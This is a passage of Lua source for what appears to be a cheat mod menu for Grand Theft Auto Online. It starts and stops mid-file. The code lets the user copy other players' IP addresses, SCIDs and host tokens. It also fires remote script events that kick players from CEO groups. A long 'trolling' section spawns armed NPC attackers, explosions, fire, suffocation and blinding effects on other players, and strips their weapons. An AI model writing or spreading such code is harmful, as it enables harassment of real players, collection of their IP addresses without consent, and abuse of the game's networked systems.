        menu.add_player_feature("copy scid to clipboard", "action", info_stuff.id, function(feat, pid)
            local player_ip = player.get_player_scid(pid)
            utils.to_clipboard(""..player_ip.."")
                end)
                menu.add_player_feature("copy ip to clipboard", "action", info_stuff.id, function(feat, pid)
                    local player_ip = player.get_player_ip(pid)
                    utils.to_clipboard(""..player_ip.."")
                        end)
                        menu.add_player_feature("copy host token to clipboard", "action", info_stuff.id, function(feat, pid)
                            local player_ip = player.get_player_host_token(pid)
                            utils.to_clipboard(""..player_ip.."")
                                end)

------------info stuff above ------------------------------------- CEO / MC STUFF BELOW --------------
menu.add_player_feature("CEO BAN", "action", ceomc.id, function(feat, pid)
    script.trigger_script_event(0x50c72ec2, pid, {0, 1, 5, 0})
end)

menu.add_player_feature("CEO DISMISS", "action", ceomc.id, function(feat, pid)
    script.trigger_script_event(0xed1bc159, pid, {0, 1, 5})
end)

menu.add_player_feature("CEO TERMINATE", "action", ceomc.id, function(feat, pid)
    script.trigger_script_event(0xed1bc159, pid, {1, 1, 6})
    script.trigger_script_event(0xed1bc159, pid, {0, 1, 6, 0})
end)

menu.add_player_feature("Send Hit Squad", "action", ceomc.id, function(playerfeat, pid)
    local hash = gameplay.get_hash_key("G_M_M_Slasher_01")
    
    streaming.request_model(hash)
    while (not streaming.has_model_loaded(hash)) do
       system.wait(0)
    end
    
    for i = 1, 10 do
       local pos = entity.get_entity_coords(player.get_player_ped(pid))
       pos.x = pos.x + math.random(-20, 20+i)
       pos.y = pos.y + math.random(-20, 20)
      
       local Peds = ped.create_ped(4, hash, pos, 1.0, true, false)
       weapon.give_delayed_weapon_to_ped(Peds, 0x476BF155, 0, true)
       ped.set_ped_health(Peds, 410)
       ped.set_ped_combat_ability(Peds, 2)
       ped.set_ped_combat_attributes(Peds, 5, true)
       ai.task_combat_ped(Peds, player.get_player_ped(pid), 1, 16)
       ped.set_ped_relationship_group_hash(Peds, 0x84DCFAAD)
       gameplay.shoot_single_bullet_between_coords(entity.get_entity_coords(Peds), entity.get_entity_coords(Peds) + v3(0, 0.0, 0.1), 0, 453432689, player.get_player_ped(pid), false, true, 100)
       streaming.set_model_as_no_longer_needed(hash)   
    end
 end)


---------------------------- ceo/mc above -----------------------------------------------
---------------------------- TROLLING BELOW --------------------------------------------
local killing_eye_v1=menu.add_player_feature(
    "Laser eye V1",
    "toggle",
    trolling.id,
    function(a)
        menu.notify("Press X to use","Universe",5,6)
        local me=player.player_id()
        local my_ped=player.get_player_ped(me)
        weapon.give_weapon_component_to_ped(my_ped,177293209,0x89EBDAA7)
        while a.on do
            system.yield(0)
            local me=player.player_id()
            local my_ped=player.get_player_ped(me)
            if controls.get_control_normal(0,252)==0.0 then
                state=nil
            else
                state=1
            end
            while state do
                local success, v3_start = ped.get_ped_bone_coords(my_ped, 0x67f2, v3())
                while not success do
                    success, v3_start = ped.get_ped_bone_coords(my_ped, 0x67f2, v3())
                    system.wait(0)
                end
                local dir = cam.get_gameplay_cam_rot()
                dir:transformRotToDir()
                dir = dir * 1.5
                v3_start = v3_start + dir + v3(0,0,1)
                dir = nil
                local v3_end = player.get_player_coords(me)
                dir = cam.get_gameplay_cam_rot()
                dir:transformRotToDir()
                dir = dir * 1500
                v3_end = v3_end + dir
                gameplay.shoot_single_bullet_between_coords(v3_start, v3_end, 1, 177293209, my_ped, true, false, 1000)
                system.yield(0)
                return HANDLER_CONTINUE
            end
        end
    end

)

local killing_eye_v2=menu.add_player_feature(
    "Laser eye V2",
    "toggle",
    trolling.id,
    function(a)
        menu.notify("Press X to use","Universe",5,6)
        local me=player.player_id()
        local my_ped=player.get_player_ped(me)
        weapon.give_weapon_component_to_ped(my_ped,1432025498,0x3BE4465D)
        while a.on do
            system.yield(0)
            local me=player.player_id()
            local my_ped=player.get_player_ped(me)
            if controls.get_control_normal(0,252)==0.0 then
                state=nil
            else
                state=1
            end
            while state do
                local success, v3_start = ped.get_ped_bone_coords(my_ped, 0x67f2, v3())
                while not success do
                    success, v3_start = ped.get_ped_bone_coords(my_ped, 0x67f2, v3())
                    system.wait(0)
                end
                local dir = cam.get_gameplay_cam_rot()
                dir:transformRotToDir()
                dir = dir * 1.5
                v3_start = v3_start + dir + v3(0,0,1)
                dir = nil
                local v3_end = player.get_player_coords(me)
                dir = cam.get_gameplay_cam_rot()
                dir:transformRotToDir()
                dir = dir * 1500
                v3_end = v3_end + dir
                gameplay.shoot_single_bullet_between_coords(v3_start, v3_end, 1, 1432025498, my_ped, true, false, 1000)
                system.yield(0)
                return HANDLER_CONTINUE
            end
        end
    end

)

local killing_eye_v3=menu.add_player_feature(
    "Laser eye V3",
    "toggle",
    trolling.id,
    function(a)
        menu.notify("Press X to use","Universe",5,6)
        while a.on do
            system.yield(0)
            local me=player.player_id()
            local my_ped=player.get_player_ped(me)
            if controls.get_control_normal(0,252)==0.0 then
                state=nil
            else
                state=1
            end
            while state do
                local success, v3_start = ped.get_ped_bone_coords(my_ped, 0x67f2, v3())
                while not success do
                    success, v3_start = ped.get_ped_bone_coords(my_ped, 0x67f2, v3())
                    system.wait(0)
                end
                local dir = cam.get_gameplay_cam_rot()
                dir:transformRotToDir()
                dir = dir * 1.5
                v3_start = v3_start + dir + v3(0,0,1)
                dir = nil
                local v3_end = player.get_player_coords(me)
                dir = cam.get_gameplay_cam_rot()
                dir:transformRotToDir()
                dir = dir * 1500
                v3_end = v3_end + dir
                gameplay.shoot_single_bullet_between_coords(v3_start, v3_end, 1, 1834241177, my_ped, true, false, 1000)
                system.yield(0)
                return HANDLER_CONTINUE
            end
        end
    end

)

-- Enhanced cages
menu.add_player_feature("Enhanced & Expanded Caging", "action", trolling.id, function(playerfeat, pid)
    ped.clear_ped_tasks_immediately(player.get_player_ped(pid))
    system.wait(0)
    local pos = player.get_player_coords(pid)
    object.create_object(gameplay.get_hash_key("as_prop_as_target_scaffold_01a"), v3(pos.x, pos.y - 0.5, pos.z - 1), true, false)
end)


--    _   __    ____    ______         ______                   __    __    _                  
--   / | / /   / __ \  / ____/        /_  __/   _____  ____    / /   / /   (_)   ____    ____ _
--  /  |/ /   / /_/ / / /              / /     / ___/ / __ \  / /   / /   / /   / __ \  / __ `/
-- / /|  /   / ____/ / /___           / /     / /    / /_/ / / /   / /   / /   / / / / / /_/ / 
--/_/ |_/   /_/      \____/          /_/     /_/     \____/ /_/   /_/   /_/   /_/ /_/  \__, /  
--                                                                                    /____/   
-- Make nearby NPCs musicians
menu.add_player_feature("Turn Nearby NPCs Into...", "action_value_str", trolling.id, function(playerfeat_val, pid)
    local peds = ped.get_all_peds()
    for i=1, #peds do
        if not ped.is_ped_a_player(peds[i]) then
            ped.clear_ped_tasks_immediately(peds[i])
            if (playerfeat_val.value == 0) then
                ai.task_start_scenario_in_place(peds[i], "WORLD_HUMAN_MUSICIAN", 0, true)
            elseif (playerfeat_val.value == 1) then
                ai.task_start_scenario_in_place(peds[i], "WORLD_HUMAN_PROSTITUTE_LOW_CLASS", 0, true)
            elseif (playerfeat_val.value == 2) then
                ai.task_start_scenario_in_place(peds[i], "WORLD_HUMAN_HUMAN_STATUE", 0, true)
            elseif (playerfeat_val.value == 3) then
                ai.task_start_scenario_in_place(peds[i], "WORLD_HUMAN_PAPARAZZI", 0, true)
            elseif (playerfeat_val.value == 4) then
                ai.task_start_scenario_in_place(peds[i], "WORLD_HUMAN_JANITOR", 0, true)
            end
        end
    end
end):set_str_data({"Musicians", "Prostitutes", "Statues", "Paparazzos", "Janitors"})

-- Turn Nearby NPCs into... <custom input>
menu.add_player_feature("Make NPCs Perform A Custom Scenario", "action", trolling.id, function(playerfeat, pid)
    local _input, k = input.get("Type in a custom NPC world scenario", "world_human_musician", 100, 0)
    if _input == 1 then
        return HANDLER_CONTINUE
    end
    if _input == 2 then
        return HANDLER_POP
    end

    local peds = ped.get_all_peds()
    for i=1, #peds do
        if not ped.is_ped_a_player(peds[i]) then
            ped.clear_ped_tasks_immediately(peds[i])
            ai.task_start_scenario_in_place(peds[i], k:upper(), 0, true)
        end
    end
end)

-- Make nearby NPCs flop around
menu.add_player_feature("Make Nearby NPCs Flop Around", "toggle", trolling.id, function(playerfeat_toggle, pid)
    local peds = ped.get_all_peds()
    while playerfeat_toggle.on do
        for i=1, #peds do
            if not ped.is_ped_a_player(peds[i]) then
                ped.clear_ped_tasks_immediately(peds[i])
                ai.task_sky_dive(peds[i], true)
            end
        end
        system.wait(1500)
    end
end)

-- Spawn a copy of player
menu.add_player_feature("Spawn Clone Follower", "value_str", trolling.id, function(playerfeat_toggle_val, pid)
    local MP_ped
    if (player.is_player_female(pid)) then
        MP_ped = 0x9C9EFFD8
    else
        MP_ped = 0x705E61F2
    end
    local plyr_clothes = {
        player_mask = ped.get_ped_drawable_variation(player.get_player_ped(pid), 1),
        player_top = ped.get_ped_drawable_variation(player.get_player_ped(pid), 11),
        player_legs = ped.get_ped_drawable_variation(player.get_player_ped(pid), 4),
        player_vest = ped.get_ped_drawable_variation(player.get_player_ped(pid), 9),
        player_hair = ped.get_ped_drawable_variation(player.get_player_ped(pid), 2),
        player_undershirts = ped.get_ped_drawable_variation(player.get_player_ped(pid), 8),
        player_torso = ped.get_ped_drawable_variation(player.get_player_ped(pid), 3),
        player_feet = ped.get_ped_drawable_variation(player.get_player_ped(pid), 6),
        player_accessories = ped.get_ped_drawable_variation(player.get_player_ped(pid), 7),
        player_hats = ped.get_ped_prop_index(player.get_player_ped(pid), 0),
        player_glasses = ped.get_ped_prop_index(player.get_player_ped(pid), 1),
        player_ears = ped.get_ped_prop_index(player.get_player_ped(pid), 2),
        player_watches = ped.get_ped_prop_index(player.get_player_ped(pid), 6),
        player_bracelets = ped.get_ped_prop_index(player.get_player_ped(pid), 7),
    }
    local plyr_cloth_tex = {
        player_mask_tex = ped.get_ped_texture_variation(player.get_player_ped(pid), 1),
        player_top_tex = ped.get_ped_texture_variation(player.get_player_ped(pid), 11),
        player_legs_tex = ped.get_ped_texture_variation(player.get_player_ped(pid), 4),
        player_vest_tex = ped.get_ped_texture_variation(player.get_player_ped(pid), 9),
        player_hair_tex = ped.get_ped_texture_variation(player.get_player_ped(pid), 2),
        player_undershirts_tex = ped.get_ped_texture_variation(player.get_player_ped(pid), 8),
        player_torso_tex = ped.get_ped_texture_variation(player.get_player_ped(pid), 3),
        player_accessories_tex = ped.get_ped_texture_variation(player.get_player_ped(pid), 7),
        player_feet_tex = ped.get_ped_texture_variation(player.get_player_ped(pid), 6),
        player_hats_tex = ped.get_ped_prop_texture_index(player.get_player_ped(pid), 0),
        player_glasses_tex = ped.get_ped_prop_texture_index(player.get_player_ped(pid), 1),
        player_ears_tex = ped.get_ped_prop_texture_index(player.get_player_ped(pid), 2),
        player_watches_tex = ped.get_ped_prop_texture_index(player.get_player_ped(pid), 6),
        player_bracelets_tex = ped.get_ped_prop_texture_index(player.get_player_ped(pid), 7)
    }
    local _hb = ped.get_ped_head_blend_data(player.get_player_ped(pid))

    streaming.request_model(MP_ped)
    while (not streaming.has_model_loaded(MP_ped)) do
        system.wait(10)
    end

    local _ped
    if (playerfeat_toggle_val.value == 0) then
        menu.notify("Spawned a clone Follower of "..player.get_player_name(pid)..". This only works if you're in range or spectating the player.", "", 10, 0x00ff00)
        _ped = ped.create_ped(1, MP_ped, player.get_player_coords(pid) + v3(math.random(-100, 100), math.random(-100, 100), 0), 0, true, false)
    elseif (playerfeat_toggle_val.value == 1) then
        menu.notify("Spawned a clone Follower of "..player.get_player_name(pid)..". This only works if you're in the same interior as the target player.", "", 10, 0x00ff00)
        _ped = ped.create_ped(1, MP_ped, player.get_player_coords(pid) + v3(math.random(-5, 5), math.random(-5, 5), 0), 0, true, false)
    end
    ped.set_ped_component_variation(_ped, 1, plyr_clothes["player_mask"], plyr_cloth_tex["player_mask_tex"], 0)
    ped.set_ped_component_variation(_ped, 11, plyr_clothes["player_top"], plyr_cloth_tex["player_top_tex"], 0)
    ped.set_ped_component_variation(_ped, 4, plyr_clothes["player_legs"], plyr_cloth_tex["player_legs_tex"], 0)
    ped.set_ped_component_variation(_ped, 9, plyr_clothes["player_vest"], plyr_cloth_tex["player_vest_tex"], 0)
    ped.set_ped_component_variation(_ped, 2, plyr_clothes["player_hair"], plyr_cloth_tex["player_hair_tex"], 0)
    ped.set_ped_component_variation(_ped, 8, plyr_clothes["player_undershirts"], plyr_cloth_tex["player_undershirts_tex"], 0)
    ped.set_ped_component_variation(_ped, 3, plyr_clothes["player_torso"], plyr_cloth_tex["player_torso_tex"], 0)
    ped.set_ped_component_variation(_ped, 7, plyr_clothes["player_accessories"], plyr_cloth_tex["player_accessories_tex"], 0)
    ped.set_ped_component_variation(_ped, 6, plyr_clothes["player_feet"], plyr_cloth_tex["player_feet_tex"], 0)
    ped.set_ped_prop_index(_ped, 0, plyr_clothes["player_hats"], plyr_cloth_tex["player_hats_tex"], 0)
    ped.set_ped_prop_index(_ped, 1, plyr_clothes["player_glasses"], plyr_cloth_tex["player_glasses_tex"], 0)
    ped.set_ped_prop_index(_ped, 2, plyr_clothes["player_ears"], plyr_cloth_tex["player_ears_tex"], 0)
    ped.set_ped_prop_index(_ped, 6, plyr_clothes["player_watches"], plyr_cloth_tex["player_watches_tex"], 0)
    ped.set_ped_prop_index(_ped, 7, plyr_clothes["player_bracelets"], plyr_cloth_tex["player_bracelets_tex"], 0)
    ped.set_ped_head_blend_data(_ped, _hb["shape_first"], _hb["shape_second"], _hb["shape_third"], _hb["skin_first"], _hb["skin_second"], _hb["skin_third"], _hb["mix_shape"], _hb["mix_skin"], _hb["mix_third"])

    local blippy = ui.add_blip_for_entity(_ped)
    ui.set_blip_sprite(blippy, 1)

    system.wait(450)
    network.request_control_of_entity(MP_ped)
    while playerfeat_toggle_val.on do
        if (playerfeat_toggle_val.value == 0) then
            ai.task_go_to_coord_by_any_means(_ped, player.get_player_coords(pid) + v3(math.random(-4, 4), math.random(-4, 4), 0), math.random(1, 2), 0, true, 1, 0.0)
            system.wait(2000)
        elseif (playerfeat_toggle_val.value == 1) then
            ai.task_go_to_coord_by_any_means(_ped, player.get_player_coords(pid) + v3(math.random(-4, 4), math.random(-4, 4), 0), math.random(0, 1), 0, true, 1, 0.0)
            system.wait(2000)
        end
        if (entity.is_entity_dead(_ped)) then
            playerfeat_toggle_val.on = false
            menu.notify("Copy of " .. player.get_player_name(pid) .. " died. Toggling \"Spawn Clone Follower\" off.")
        end
    end
    if (not playerfeat_toggle_val.on) then
        entity.set_entity_as_no_longer_needed(_ped)
        entity.delete_entity(_ped)
    end
end):set_str_data({"Outside", "Inside"})

----------------------------------------------------------------------------------------------------------------------------------------
menu.add_player_feature("Remove Explosive Rounds", "action", trolling.id, function(playerfeat, pid)
    menu.notify("Removed explosive rounds from " .. player.get_player_name(pid) .. "'s Sniper Rifle Mk2.", "Anti-Tryhard Measures", 10, 2)
    weapon.remove_weapon_component_from_ped(player.get_player_ped(pid), 0xA914799, 0x89EBDAA7)
end)

menu.add_player_feature("Remove Common EWO Explosives", "action", trolling.id, function(playerfeat, pid)
    menu.notify("Removed common EWO explosives from " .. player.get_player_name(pid), "Anti-Tryhard Measures", 10, 2)
    weapon.remove_weapon_from_ped(player.get_player_ped(pid), 0xB1CA77B1) --RPG
    weapon.remove_weapon_from_ped(player.get_player_ped(pid), 0x63AB0442) --Homing Launcher
    weapon.remove_weapon_from_ped(player.get_player_ped(pid), 0x2C3731D9) --Sticky Bomb
end)

menu.add_player_feature("Remove All Explosives", "action", trolling.id, function(playerfeat, pid)
    menu.notify("Removed all explosives from " .. player.get_player_name(pid), "Anti-Tryhard Measures", 10, 2)
    weapon.remove_weapon_from_ped(player.get_player_ped(pid), 0xB1CA77B1) --RPG
    weapon.remove_weapon_from_ped(player.get_player_ped(pid), 0x63AB0442) --Homing Launcher
    weapon.remove_weapon_from_ped(player.get_player_ped(pid), 0xA284510B) --Grenade Launcher
    weapon.remove_weapon_from_ped(player.get_player_ped(pid), 0x0781FE4A) --Compact Grenade Launcher
    weapon.remove_weapon_from_ped(player.get_player_ped(pid), 0x93E220BD) --Grenade
    weapon.remove_weapon_from_ped(player.get_player_ped(pid), 0x2C3731D9) --Sticky Bomb
    weapon.remove_weapon_from_ped(player.get_player_ped(pid), 0xAB564B93) --Proximity Mine
    weapon.remove_weapon_from_ped(player.get_player_ped(pid), 0xBA45E8B8) --Pipebomb
end)

menu.add_player_feature("Fire Jet", "action", trolling.id, function(playerfeat, pid)
    menu.notify("Burnt " .. player.get_player_name(pid).. " with a gout of fire", "Fire Jet", 10, 2)
    local pos = player.get_player_coords(pid)
    pos.z = pos.z -1
    fire.add_explosion(pos, 12, true, false, 0, pid)
end)

--A water jet
menu.add_player_feature("Water Jet", "action", trolling.id, function(playerfeat, pid)
    menu.notify("Doused " .. player.get_player_name(pid) .. " with water", "Water Jet", 10, 2)
    local pos = player.get_player_coords(pid)
    pos.z = pos.z -1
    fire.add_explosion(pos, 13, true, false, 0, pid)
end)

menu.add_player_feature("Spawn A Jet Spray", "action_value_str", trolling.id, function(playerfeat_val, pid)
    local pos = player.get_player_coords(pid)
    pos.z = pos.z -1
    if (playerfeat_val.value == 0) then
        menu.notify("Burnt " .. player.get_player_name(pid).. " with a gout of fire", "Fire Jet", 10, 2)
        fire.add_explosion(pos, 12, true, false, 0, pid)
    elseif (playerfeat_val.value == 1) then
        menu.notify("Doused " .. player.get_player_name(pid) .. " with water", "Water Jet", 10, 2)
        fire.add_explosion(pos, 13, true, false, 0, pid)
    elseif (playerfeat_val.value == 2) then
        menu.notify("Blasted " .. player.get_player_name(pid) .. " with steam", "Steam Jet", 10, 2)
        fire.add_explosion(pos, 11, true, false, 0, pid)
    elseif (playerfeat_val.value == 3) then
        menu.notify("Blasted " .. player.get_player_name(pid) .. " with fire extinguisher contents", "Steam Jet", 10, 2)
        fire.add_explosion(pos, 24, true, false, 0, pid)
    end
end):set_str_data({"Fire Jet", "Water Jet", "Steam jet", "Extinguisher Jet"})

menu.add_player_feature("Rain Stuff On Player", "value_str", trolling.id, function(playerfeat_toggle_val, pid)
    menu.notify("Raining stuff on" .. player.get_player_name(pid), "Rain", 10, 2)
    while playerfeat_toggle_val.on do
        local pos_start = v3()
        pos_start = player.get_player_coords(pid)
        pos_start.z = pos_start.z + 25.0
        local pos_end = player.get_player_coords(pid)
        local offset = v3()
        offset.x = math.random(-5,5)
        offset.y = math.random(-5,5)
        if (playerfeat_toggle_val.value == 0) then
            gameplay.shoot_single_bullet_between_coords(pos_start, pos_end + offset, 200, 0x13579279, pid, true, false, -1)
        elseif (playerfeat_toggle_val.value == 1) then
            gameplay.shoot_single_bullet_between_coords(pos_start, pos_end + offset, 200, 0x0781FE4A, pid, true, false, -1)
        elseif (playerfeat_toggle_val.value == 2) then
            gameplay.shoot_single_bullet_between_coords(pos_start, pos_end + offset, 200, 0xBA45E8B8, pid, true, false, -1)
        elseif (playerfeat_toggle_val.value == 3) then
            gameplay.shoot_single_bullet_between_coords(pos_start, pos_end + offset, 200, 0x7F7497E5, pid, true, false, -1)
        elseif (playerfeat_toggle_val.value == 4) then
            gameplay.shoot_single_bullet_between_coords(pos_start, pos_end + offset, 200, 0x5D6660AB, pid, true, false, -1)
        elseif (playerfeat_toggle_val.value == 5) then
            gameplay.shoot_single_bullet_between_coords(pos_start, pos_end + offset, 200, 0x2C082D7D, pid, true, false, -1)
        elseif (playerfeat_toggle_val.value == 2) then
            gameplay.shoot_single_bullet_between_coords(pos_start, pos_end + offset, 200, 0xFDBC8A50, pid, true, false, -1)
        elseif (playerfeat_toggle_val.value == 3) then
            gameplay.shoot_single_bullet_between_coords(pos_start, pos_end + offset, 200, 0x24B17070, pid, true, false, -1)
        end
        system.wait(500)
    end
end):set_str_data({"Rockets", "Grenades","Pipebomb","Firework","Lazer","AirDefence", "Smoke Grenades", "Molotovs"})

--A steam jet
menu.add_player_feature("Steam Jet", "action", trolling.id, function(playerfeat, pid)
    menu.notify("Blasted " .. player.get_player_name(pid) .. " with steam", "Steam Jet", 10, 2)
    local pos = player.get_player_coords(pid)
    pos.z = pos.z -1
    fire.add_explosion(pos, 11, true, false, 0, pid)
end)

--Constant Steam Jets
menu.add_player_feature("Constant Steam Jets", "toggle", trolling.id, function(eToggle, pid)
    menu.notify("Throwing " .. player.get_player_name(pid) .. " around with steam", "Steaming", 10, 2)
    while eToggle.on do
        local pos = player.get_player_coords(pid)
        pos.z = pos.z -1
        fire.add_explosion(pos, 11, true, false, 0, pid)
        system.wait(0)
    end
end)

--Floods
menu.add_player_feature("100-year Flood", "toggle", trolling.id, function(eToggle, pid)
    menu.notify("Giving " .. player.get_player_name(pid) .. " a once in a century flood", "Flooding", 10, 2)
    while eToggle.on do
        local pos = player.get_player_coords(pid)
        pos.z = pos.z -1
        fire.add_explosion(pos, 13, true, false, 0, pid)
        system.wait(0)
    end
end)

--Firey Death Inferno
menu.add_player_feature("Firey Death Inferno", "toggle", trolling.id, function(eToggle, pid)
    menu.notify("Throwing " .. player.get_player_name(pid) .. " into an inferno", "Inferno", 10, 2)
    while eToggle.on do
        local pos = player.get_player_coords(pid)
        pos.z = pos.z -1
        fire.add_explosion(pos, 12, true, false, 0, pid)
        system.wait(0)
    end
end)

menu.add_player_feature("Set Player Vehicle Ablaze", "action", trolling.id, function(playerfeat, pid)
    local player_veh = ped.get_vehicle_ped_is_using(player.get_player_ped(pid))
    if (player.is_player_in_any_vehicle(pid)) then
        menu.notify("Destroyed " .. player.get_player_name(pid) .. "'s " .. vehicle.get_vehicle_model(player_veh), "", 10, 2)
        --set_vehicle_engine_on(Vehicle veh, bool toggle, bool instant, bool noAutoTurnOn)
        --vehicle.set_vehicle_engine_on(player_veh, false, true, true)
        --ped.clear_ped_tasks_immediately(player.get_player_ped(pid))
        vehicle.set_vehicle_engine_health(player_veh, -100.0)
    else
        menu.notify(player.get_player_name(pid) .. " is not in a vehicle", "", 10, 2)
    end
end)

--Suffocate a player
menu.add_player_feature("Suffocate Player", "action", trolling.id, function(playerfeat, pid)
    menu.notify("Suffocating " .. player.get_player_name(pid), "", 10, 2)
    local pos = player.get_player_coords(pid)
    pos.z = pos.z + 1
    for i=1,5 do
        entity.freeze_entity(player.get_player_ped(pid), true)
        fire.add_explosion(pos, 21, true, false, 0, pid)
    end
    system.wait(15000)
    entity.freeze_entity(player.get_player_ped(pid), false)
end)

--Blind a player
menu.add_player_feature("Blind Player", "toggle", trolling.id, function(eToggle, pid)
    menu.notify("Blinding " .. player.get_player_name(pid), "", 10, 2)
    while eToggle.on do
        local pos = player.get_player_coords(pid)
        local facing = player.get_player_heading(pid)
        pos.z = pos.z + 0.7
        fire.add_explosion(pos, 22, false, false, 0, pid)
        system.wait(100)
    end
end)

-- Spawn an explosion whenever someone approaches the strip club
menu.add_player_feature("Force Player To Be Christian", "toggle", trolling.id, function(playerfeat_toggle, pid)
    while (playerfeat_toggle.on) do
        local player_pos = player.get_player_coords(pid)
        local world_pos1 = v3(128 + 5, -1298 + 5, 29 + 5)
        local world_pos2 = v3(128 - 5, -1298 - 5, 29 - 5)

        
        if (player_pos.x <= world_pos1.x) and (player_pos.y <= world_pos1.y) and (player_pos.z <= world_pos1.z) and (player_pos.x >= world_pos2.x) and (player_pos.y >= world_pos2.y) and (player_pos.z >= world_pos2.z) then
            fire.add_explosion(player_pos, 59, true, true, 0, pid)
        end
        system.wait(5000)
    end
end)

menu.add_player_feature("Burn The Target", "action", trolling.id, function(playerfeat, pid)

    local playerped3 = player.get_player_ped(pid)
    local pos = v3()
    attach_object1132 = object.create_object(-1065766299, pos, true, false)
    entity.attach_entity_to_entity(attach_object1132, playerped3, 0, pos, pos, true, true, false, 0, false)
    end)

menu.add_player_feature("Conehead", "action", trolling.id, function(playerfeat, pid)

    local playerped3 = player.get_player_ped(pid)                                    
    local pos = v3()
    pos.z = pos.z + 0.50
    attach_object1132 = object.create_object(-1059647297, pos, true, false)
    entity.attach_entity_to_entity(attach_object1132, playerped3, 0, pos, pos, true, true, false, 0, false)
    end)


menu.add_player_feature("Burning Conehead", "action", trolling.id, function(playerfeat, pid)

    local playerped3 = player.get_player_ped(pid)
    local pos = v3()
    attach_object1132 = object.create_object(-1065766299, pos, true, false)
    entity.attach_entity_to_entity(attach_object1132, playerped3, 0, pos, pos, true, true, false, 0, false)

     local playerped3 = player.get_player_ped(pid)
    local pos = v3()
    attach_object1132 = object.create_object(546252211, pos, true, false)
    entity.attach_entity_to_entity(attach_object1132, playerped3, 0, pos, pos, true, true, false, 0, false)
    end)

menu.add_player_feature("Trashman", "action", trolling.id, function(playerfeat, pid)
    

    local playerped3 = player.get_player_ped(pid)
    local pos = v3()
    pos.z = pos.z + 0.10
    attach_object1132 = object.create_object(-93819890, pos, true, false)
    entity.attach_entity_to_entity(attach_object1132, playerped3, 0, pos, pos, true, true, false, 0, false)

    local pos1 = player.get_player_coords(pid)
    pos1.z = pos1.z + 0.10                                     
    local cageobjecthash = gameplay.get_hash_key("prop_ld_rub_binbag_01") 
    local cageobject = object.create_object(cageobjecthash, pos1, true, false)
    end)

menu.add_player_feature("Trashman v2", "action", trolling.id, function(playerfeat, pid)
    

    local playerped3 = player.get_player_ped(pid)
    local pos = v3()
    pos.z = pos.z + 0.10
    attach_object1132 = object.create_object(1143474856, pos, true, false)
    entity.attach_entity_to_entity(attach_object1132, playerped3, 0, pos, pos, true, true, false, 0, false)

    local pos1 = player.get_player_coords(pid)
    pos1.z = pos1.z + 0.10                                     
    local cageobjecthash = gameplay.get_hash_key("prop_ld_rub_binbag_01") 
    local cageobject = object.create_object(cageobjecthash, pos1, true, false)
    end)


menu.add_player_feature("Cactus Jack", "action", trolling.id, function(playerfeat, pid)
local playerped3 = player.get_player_ped(pid)
    local pos = v3()
    pos.z = pos.z -0.10
    attach_object1132 = object.create_object(-194496699, pos, true, false)
    entity.attach_entity_to_entity(attach_object1132, playerped3, 0, pos, pos, true, true, false, 0, false)
end)

menu.add_player_feature("Hyrdrant Man", "action", trolling.id, function(playerfeat, pid)
local playerped3 = player.get_player_ped(pid)
    local pos = v3()
    pos.z = pos.z + 0.10
    attach_object1132 = object.create_object(200846641, pos, true, false)
    entity.attach_entity_to_entity(attach_object1132, playerped3, 0, pos, pos, true, true, false, 0, false)
end)

menu.add_player_feature("Chess Player", "action", trolling.id, function(playerfeat, pid)
local playerped3 = player.get_player_ped(pid)
    local pos = v3()
    pos.z = pos.z + 0.10
    attach_object1132 = object.create_object(-259356231, pos, true, false)
    entity.attach_entity_to_entity(attach_object1132, playerped3, 0, pos, pos, true, true, false, 0, false)
end)

menu.add_player_feature("Gas Pump Man", "action", trolling.id, function(playerfeat, pid)
local playerped3 = player.get_player_ped(pid)
    local pos = v3()
    pos.z = pos.z - 0.50
    attach_object1132 = object.create_object(-2007231801, pos, true, false)
    entity.attach_entity_to_entity(attach_object1132, playerped3, 0, pos, pos, true, true, false, 0, false)
end)


menu.add_player_feature("Umbrella Man", "action", trolling.id, function(playerfeat, pid)
local playerped3 = player.get_player_ped(pid)
    local pos = v3()
    pos.z = pos.z + 0.10
    attach_object1142 = object.create_object(-2108662770, pos, true, false)
    entity.attach_entity_to_entity(attach_object1142, playerped3, 0, pos, pos, true, true, false, 0, false)
end)

menu.add_player_feature("Soccer Boy", "action", trolling.id, function(playerfeat, pid)

    local pos1 = player.get_player_coords(pid)
    pos1.z = pos1.z + 0.10                                     
    local cageobjecthash = gameplay.get_hash_key("p_ld_soc_ball_01") 
    local cageobject = object.create_object(cageobjecthash, pos1, true, false)
end)


menu.add_player_feature("Football Boy", "action", trolling.id, function(playerfeat, pid)

    local pos1 = player.get_player_coords(pid)
    pos1.z = pos1.z + 0.10                                     
    local cageobjecthash = gameplay.get_hash_key("p_ld_am_ball_01") 
    local cageobject = object.create_object(cageobjecthash, pos1, true, false)
end)


menu.add_player_feature("Basketball Boy", "action", trolling.id, function(playerfeat, pid)

    local pos1 = player.get_player_coords(pid)
    pos1.z = pos1.z + 0.10                                     
    local cageobjecthash = gameplay.get_hash_key("prop_bskball_01") 
    local cageobject = object.create_object(cageobjecthash, pos1, true, false)
end)

menu.add_player_feature("Bowling Ball Boy", "action", trolling.id, function(playerfeat, pid)

    local pos1 = player.get_player_coords(pid)
    pos1.z = pos1.z + 0.10                                     
    local cageobjecthash = gameplay.get_hash_key("prop_bowling_ball") 
    local cageobject = object.create_object(cageobjecthash, pos1, true, false)
end)

menu.add_player_feature("Baritone Saxophone", "action", trolling.id, function(playerfeat, pid)
    audio.play_sound_from_coord(-1,"Horn", entity.get_entity_coords(player.get_player_ped(pid)), "DLC_Apt_Yacht_Ambient_Soundset", true, 5, false)
end)

menu.add_player_feature("Camera Shutter", "action", trolling.id, function(playerfeat, pid)
    audio.play_sound_from_coord(-1,"SHUTTER_FLASH", entity.get_entity_coords(player.get_player_ped(pid)), "CAMERA_FLASH_SOUNDSET", true, 5, false)
end) 

menu.add_player_feature("Walkie-Talkie", "action", trolling.id, function(playerfeat, pid)
    audio.play_sound_from_coord(-1,"Start_Squelch", entity.get_entity_coords(player.get_player_ped(pid)), "CB_RADIO_SFX", true, 5, false)
end)

menu.add_player_feature("Level Up!", "action", trolling.id, function(playerfeat, pid)
    audio.play_sound_from_coord(-1,"Rank_Up", entity.get_entity_coords(player.get_player_ped(pid)), "HUD_AWARDS", true, 5, false)
end)

menu.add_player_feature("Fast Beeping", "action", trolling.id, function(playerfeat, pid)
    audio.play_sound_from_coord(-1, "Beep_Red", entity.get_entity_coords(player.get_player_ped(pid)), "DLC_HEIST_HACKING_SNAKE_SOUNDS", true, 5, false)
end)

menu.add_player_feature("Wind??", "action", trolling.id, function(playerfeat, pid)
